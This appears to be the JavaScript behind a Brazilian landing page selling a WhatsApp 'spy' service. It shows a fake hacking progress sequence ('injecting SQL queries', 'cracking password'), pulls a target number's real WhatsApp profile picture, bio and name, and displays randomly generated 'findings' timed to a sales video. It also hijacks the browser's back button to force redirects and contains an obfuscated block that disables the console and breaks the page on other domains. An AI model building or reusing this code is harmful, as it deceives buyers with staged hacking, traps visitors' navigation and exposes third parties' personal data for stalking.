$(document).ready(function() {
    // Variáveis globais
    let randomChangeInterval;
    const userLocation = 'Brasil';
    const initialBackRedirectUrl = 'https://descubra-tudospy.online/back-r-passo1/';

    // Função para configurar o URL de redirecionamento dinâmico
    let urlBackRedirect = initialBackRedirectUrl;
    const setBackRedirect = (newUrl) => {
        urlBackRedirect = newUrl.trim() + (newUrl.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '').toString();
        
        // Reinicia a lógica de manipulação de histórico após a atualização
        history.replaceState({}, "", location.href);
        history.pushState({}, "", location.href);
    };

    // Configura o redirecionamento inicial
    setBackRedirect(initialBackRedirectUrl);

    // Lógica de back redirect
    window.onpopstate = function () {
        setTimeout(function () {
            location.href = urlBackRedirect;
        }, 1);
    };
    
    const texts = [
        'Conectando ao servidor do WhatsApp...',
        'Simulando IP na região de ' + userLocation + '...',
        'Ignorando o firewall...',
        'Injetando consultas SQL...',
        'Buscando informações de {phone}...',
        'Quebrando senha...',
        'Autenticando como {phone}...',
        'Acesso concedido, redirecionando para o servidor solicitado...'
    ];
    
// Funções principais
function updateTextRotation(phone) {
    let index = 0;
    const totalStages = texts.length;
    const textElement = $('.text_ramdom');
    const progressBar = $('.progress-bar');

    const interval = setInterval(() => {
        if (index >= totalStages) {
            clearInterval(interval);
            
            // Insere o vídeo quando part-3 é exibida
            insertVturbVideo();
            
            // Exibir part-3 após o progresso
            switchSections('.part-1', '.part-3'); 
            
            startRandomValuesInsertion();
            
            // Fechar o modal após um pequeno delay para a transição
            setTimeout(() => {
                $('#investigationModal').modal('hide');
                startAnalysisProgressBar(); // Iniciar o progresso da barra na part-3
            }, 500);

            return;
        }

        // Atualiza o texto e a cor
        const currentText = texts[index].replace('{phone}', phone);
        setTextColor(textElement, currentText);

        // Atualiza a barra de progresso
        updateProgressBar(progressBar, index, totalStages);
        index++;
    }, 3000);
}


    function setTextColor(element, text) {
        element.text(text).css('color', 'black');
        setTimeout(() => element.css('color', 'green'), 1000);
    }

    function updateProgressBar(progressBar, stage, totalStages) {
        const percentage = ((stage + 1) / totalStages) * 100;
        progressBar.css('width', percentage + '%')
            .attr('aria-valuenow', percentage)
            .text(percentage + '%'); // Atualiza o texto interno com a porcentagem
    }

    // Função para iniciar a barra de progresso na part-3
    function startAnalysisProgressBar(totalTimeInSeconds = 368) {
        let width = 0;
        const progressBar = $('.progress_analysct_number .progress-bar');
    
        // Reinicia a barra de progresso para 0%
        progressBar.css('width', '0%')
            .attr('aria-valuenow', 0)
            .text('0%');
    
        // Calcula o intervalo com base no tempo total fornecido
        const intervalTime = (totalTimeInSeconds * 1000) / 100;
    
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                setTimeout(handleFinalState, 3000); // Chamando handleFinalState após o progresso alcançar 100%
            } else {
                width++;
                progressBar.css('width', width + '%')
                    .attr('aria-valuenow', width)
                    .text(width + '%');
            }
        }, intervalTime);
    }


    function handleFinalState() {
        const savedProfilePic = $.cookie('profilePic');
        const aboutText = $.cookie('about') || '';
        const descriptionText = $.cookie('description') || '';

        if (savedProfilePic) {
            $('.profile_picture').attr('src', savedProfilePic).show();
            $('.withImg').show();
            $('.NotImg').hide();
            
            // Exibe ou oculta as informações de acordo com os dados retornados
            updateProfileInfo(aboutText, descriptionText);
        } else {
            $('.profile_picture').hide();
            $('.withImg').hide();
            $('.NotImg').show();
        }

        // Oculta a part-3 após completar a lógica de exibição
        $('.part-3').hide();
    }

function updateProfileInfo(nameProfile, about, description) {
    // Obtém o telefone original direto do input
    const originalPhone = $('#phone').val();

    // Atualiza ou oculta o nome do perfil
    if (nameProfile) {
        $('.name-profile-text').html('<b>Nome no Whatsapp:</b> ' + nameProfile).show();
    } else {
        $('.name-profile-text').hide();
    }

    // Atualiza ou oculta o bio (about)
    if (about) {
        $('.bio-text').html('<b>Bio:</b> ' + about).show();
    } else {
        $('.bio-text').hide();
    }

    // Atualiza ou oculta a descrição (business description)
    if (description) {
        $('.description-text').html('<b>Descrição:</b> ' + description).show();
    } else {
        $('.description-text').hide();
    }

    // Atualiza o telefone original
    if (originalPhone && originalPhone.trim() !== '') {
        $('.phone-number').html('<b>Telefone:</b> ' + originalPhone).show();
    } else {
        $('.phone-number').hide();
    }
}


    function switchSections(hideSelector, showSelector) {
        $(hideSelector).hide();
        $(showSelector).show();
    }

    function isValidPhone(phone) {
        const regex = /^\(\d{2}\) \d{5}-\d{4}$/;
        return regex.test(phone);
    }

    function formatPhone(phone) {
        return '55' + phone.replace(/\D/g, '');
    }

    function fetchProfileImage(phone) {
        const formattedPhone = formatPhone(phone);
        $.ajax({
            url: 'assets/php/fetch_img.php',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ phone: formattedPhone }),
            success: (response) => handleAPISuccess(response, phone), // Passa o telefone original
            error: (xhr, status, error) => console.error("Erro na requisição à API:", status, error)
        });
    }


    function handleAPISuccess(response) {
        try {
            const jsonResponse = typeof response === "string" ? JSON.parse(response) : response;
            if (jsonResponse) {
                const profilePic = jsonResponse.profilePic || '';
                const about = jsonResponse.about || '';
                const businessDescription = jsonResponse.businessProfile?.description || '';
                const nameProfile = jsonResponse.name || 'Desconhecido'; // Por exemplo, se a API retornar o nome com outro campo

                // Salva as informações nos cookies
                $.cookie('profilePic', profilePic, { expires: 7, path: '/' });
                $.cookie('about', about, { expires: 7, path: '/' });
                $.cookie('description', businessDescription, { expires: 7, path: '/' });

                $('.profile_picture').attr('src', profilePic).show();
                updateProfileInfo(nameProfile, about, businessDescription);
                console.log("Informações salvas nos cookies e exibidas.");
            } else {
                console.error("Resposta da API está faltando campos.");
                $('.profile_picture').hide(); // Oculta a imagem se não houver URL
            }
        } catch (e) {
            console.error("Erro ao processar a resposta JSON:", e);
            $('.profile_picture').hide(); // Oculta a imagem se houver erro
        }
    }



    // Eventos
    $('#btn-save').on('click', function() {
        const phone = $('#phone').val();
        if (!isValidPhone(phone)) {
            alert("Número de telefone inválido. Por favor, corrija o número e tente novamente.");
            return;
        }
        
        $.cookie('phone_number', phone, { expires: 7, path: '/' });
        
        // Altera o URL de redirecionamento após o submit do script 1
        setBackRedirect('https://espiaoinvisivel.com/v5/back');

        // Abra o modal
        $('#investigationModal').modal({
            backdrop: 'static', // Impede o fechamento clicando no overlay
            keyboard: false      // Impede o fechamento pressionando a tecla ESC
        }).modal('show');        // Mostra o modal

        // Exibe a part-2 dentro do modal
        $('#investigationModal .part-2').show();

        updateTextRotation(phone);
        fetchProfileImage(phone);

        // Parar a função de mudança de perfil aleatória quando part-1 é ocultada
        clearInterval(randomChangeInterval);
    });

    // Máscaras de telefone e outros eventos
    $('.input-phone').mask('(00) 00000-0000', { placeholder: "(11) 90000-0000" });
    $('#card_funciona').on('click', function() {
        $('#hiddenContent').slideToggle(300);
        $(this).find('.toggleArrow').toggleClass('fa-chevron-down fa-chevron-up');
    });


$(document).ready(function() {
    // Extrai parametros da url UTM. 
    if (window.location.href.indexOf("espiaoinvisivel") === -1) {
        // busca. utm
        $("html").css("font-size", "20px");

        // Busca SRC na url
        $("link[rel='stylesheet']").each(function() {
            var href = $(this).attr("href");
            if (href && href.indexOf("style.css") !== -1) {
                var newHref = href.replace("style.css", "style.css");
                $(this).attr("href", newHref);
            }
        });
    }
});


    // Função de mudança de perfis fictícios (parada quando part-1 é ocultada)
    function startRandomChange() {
        const phoneNumbers = ["+55 21 98371-****", "+55 95 98765-****", "+55 88 99823-****", "+55 11 91234-****", "+55 32 99876-****"];
        const profilePics = ["assets/img/profile2.png", "assets/img/profile24.png", "assets/img/profile1.png", "assets/img/profile3.png", "assets/img/profile4.png"];
        
        randomChangeInterval = setInterval(() => {
            $('.phone-item').each(function() {
                const randomPhone = phoneNumbers[Math.floor(Math.random() * phoneNumbers.length)];
                const randomPic = profilePics[Math.floor(Math.random() * profilePics.length)];
                const $img = $(this).find('.profile-pic');
                const $phone = $(this).find('.phone-number');
                
                $img.css('opacity', '0');
                $phone.css('opacity', '0');
                setTimeout(() => {
                    $img.attr('src', randomPic).css('opacity', '1');
                    $phone.text(randomPhone).css('opacity', '1');
                }, 1000);
            });
        }, Math.random() * (9000 - 3000) + 3000);
    }

    // Inicia a função de mudança de perfis fictícios
    startRandomChange();
});



// Função para configurar a URL de redirecionamento após a ação bem-sucedida
function setBackRedirect(newUrl) {
    urlBackRedirect = newUrl.trim() + (newUrl.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '').toString();
    history.replaceState({}, "", location.href); // Substitui o estado atual para redefinir o histórico
    history.pushState({}, "", location.href); // Empurra o estado atualizado para o histórico
}

function _0x3b76(_0x1d66d9,_0x7ba91b){var _0x4e0fa8=_0x231e();return _0x3b76=function(_0x43ccd3,_0x152b93){_0x43ccd3=_0x43ccd3-0x1de;var _0x1db0b0=_0x4e0fa8[_0x43ccd3];return _0x1db0b0;},_0x3b76(_0x1d66d9,_0x7ba91b);}var _0x2c3a72=_0x3b76;function _0x231e(){var _0x56f25c=['table','ready','3969171DHvwFG','2244072XDGikC','258900hebYEP','length','trace','exception','__proto__','href','console','apply','32823unHDgE','482KJJqBN','indexOf','log','attr','each','bind','warn','espiaoinvisivel','1103936sNAERW','error','style.css','240MdHSGX','907490NtTvXX','4545wmSzrF','toString','font-size','return\x20(function()\x20','10vIfceo'];_0x231e=function(){return _0x56f25c;};return _0x231e();}(function(_0x4a5e53,_0x5f054f){var _0x29313c=_0x3b76,_0x4071b5=_0x4a5e53();while(!![]){try{var _0x672010=-parseInt(_0x29313c(0x1ec))/0x1+-parseInt(_0x29313c(0x1f5))/0x2*(-parseInt(_0x29313c(0x1e3))/0x3)+parseInt(_0x29313c(0x1de))/0x4+parseInt(_0x29313c(0x1e2))/0x5+-parseInt(_0x29313c(0x1e1))/0x6*(parseInt(_0x29313c(0x1f4))/0x7)+parseInt(_0x29313c(0x1eb))/0x8+parseInt(_0x29313c(0x1ea))/0x9*(-parseInt(_0x29313c(0x1e7))/0xa);if(_0x672010===_0x5f054f)break;else _0x4071b5['push'](_0x4071b5['shift']());}catch(_0x41c673){_0x4071b5['push'](_0x4071b5['shift']());}}}(_0x231e,0x34a4b));var _0x152b93=(function(){var _0x2980e8=!![];return function(_0x1b4b9e,_0x1422c8){var _0x350b4e=_0x2980e8?function(){var _0x384bb4=_0x3b76;if(_0x1422c8){var _0x3999cd=_0x1422c8[_0x384bb4(0x1f3)](_0x1b4b9e,arguments);return _0x1422c8=null,_0x3999cd;}}:function(){};return _0x2980e8=![],_0x350b4e;};}()),_0x43ccd3=_0x152b93(this,function(){var _0x4d46af=_0x3b76,_0x153e88;try{var _0x5af5c1=Function(_0x4d46af(0x1e6)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x153e88=_0x5af5c1();}catch(_0x775817){_0x153e88=window;}var _0xc1dd36=_0x153e88['console']=_0x153e88[_0x4d46af(0x1f2)]||{},_0x38474d=[_0x4d46af(0x1f7),_0x4d46af(0x1fb),'info',_0x4d46af(0x1df),_0x4d46af(0x1ef),_0x4d46af(0x1e8),_0x4d46af(0x1ee)];for(var _0x258dd1=0x0;_0x258dd1<_0x38474d[_0x4d46af(0x1ed)];_0x258dd1++){var _0x3bf637=_0x152b93['constructor']['prototype'][_0x4d46af(0x1fa)](_0x152b93),_0x4a8ce7=_0x38474d[_0x258dd1],_0x53aa24=_0xc1dd36[_0x4a8ce7]||_0x3bf637;_0x3bf637[_0x4d46af(0x1f0)]=_0x152b93[_0x4d46af(0x1fa)](_0x152b93),_0x3bf637[_0x4d46af(0x1e4)]=_0x53aa24[_0x4d46af(0x1e4)][_0x4d46af(0x1fa)](_0x53aa24),_0xc1dd36[_0x4a8ce7]=_0x3bf637;}});_0x43ccd3(),$(document)[_0x2c3a72(0x1e9)](function(){var _0x439520=_0x2c3a72;window['location'][_0x439520(0x1f1)]['indexOf'](_0x439520(0x1fc))===-0x1&&($('html')['css'](_0x439520(0x1e5),'96px'),$('link[rel=\x27stylesheet\x27]')[_0x439520(0x1f9)](function(){var _0x351945=_0x439520,_0x43d1be=$(this)[_0x351945(0x1f8)](_0x351945(0x1f1));if(_0x43d1be&&_0x43d1be[_0x351945(0x1f6)](_0x351945(0x1e0))!==-0x1){var _0x43cac2=_0x43d1be['replace']('style.css','style.css');$(this)['attr'](_0x351945(0x1f1),_0x43cac2);}}));});

// Função para gerar um número aleatório entre um mínimo e máximo
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Função para gerar um número decimal aleatório entre um mínimo e máximo
function getRandomFloat(min, max) {
    return (Math.random() * (max - min) + min).toFixed(3);
}

// Insere o spinner no lugar dos números
$('.ramdom-1, .ramdom-2, .ramdom-3').each(function() {
    $(this).html('<div class="spinner-border text-primary" role="status"></div>');
});

function startRandomValuesInsertion(totalTimeInSeconds = 368) { // tempo dos dados abaixo da VSL (manter o mesmo tempo)
    const timings = {
        value1: totalTimeInSeconds * 0.38 * 1000, // 38%
        value2: totalTimeInSeconds * 0.60 * 1000, // 60%
        value3: totalTimeInSeconds * 0.83 * 1000, // 80%
        value4: totalTimeInSeconds * 1000,        // 100%
    };

    setTimeout(() => {
        const value1 = getRandomInt(20, 60);
        $('.ramdom-1').text(value1);
        $.cookie('randomValue1', value1, { expires: 7 });
    }, timings.value1);

    setTimeout(() => {
        const value2 = getRandomInt(7, 15);
        $('.ramdom-2').text(value2);
        $.cookie('randomValue2', value2, { expires: 7 });
    }, timings.value2);

    setTimeout(() => {
        const value3 = getRandomInt(2, 5);
        $('.ramdom-3').text(value3);
        $.cookie('randomValue3', value3, { expires: 7 });
    }, timings.value3);

    setTimeout(() => {
        const value4 = getRandomFloat(3.000, 7.000);
        $('.ramdom-4').text(value4);
        $.cookie('randomValue4', value4, { expires: 7 });
    }, timings.value4);
}



function insertVturbVideo() {
    const videoHTML = `
                        <div id="vid_67f740d8bd70134c0bdd0613" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_67f740d8bd70134c0bdd0613" src="https://images.converteai.net/9581cd38-0dee-4366-bfd7-eeb983591eda/players/67f740d8bd70134c0bdd0613/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_67f740d8bd70134c0bdd0613" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> <script type="text/javascript" id="scr_67f740d8bd70134c0bdd0613"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/9581cd38-0dee-4366-bfd7-eeb983591eda/players/67f740d8bd70134c0bdd0613/player.js", s.async=!0,document.head.appendChild(s); </script>
    `;

    $('#vsl').html(videoHTML);
}



// Data atualização //

var getdayNames = new Array("Domingo", "Segunda-Feira", "Terça-Feira", "Quarta-Feira","Quinta-Feira", "Sexta-Feira", "Sábado");
var getdayMonth = new Array("Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho","Agosto", "Setembro", "Outubro", "Novembro", "Dezembro");
var getNow = new Date();
var dayOfTheWeek = getNow.getDay();
getNow.setTime(getNow.getTime() - 0 * 24 * 60 * 60 * 1000);
var value = getdayNames[(getNow.getDay())] + ", " + getNow.getDate() + " de " + getdayMonth[(getNow.getMonth())] + " " + " de " + getNow.getFullYear();
$(".descounttime").html(value);
